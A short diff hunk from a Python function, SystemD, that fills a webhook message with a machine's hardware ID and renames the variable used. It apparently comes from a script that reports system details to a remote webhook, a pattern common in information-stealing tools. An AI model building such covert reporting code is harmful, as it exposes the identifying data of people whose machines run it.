@@ -24,7 +24,7 @@ def SystemD(webhook):
                 },
                 {
                     "name": "Hwid:",
-                    "value": f"`{hwid}`",
+                    "value": f"`{phwid}`",
                     "inline": True
                 },
                 {
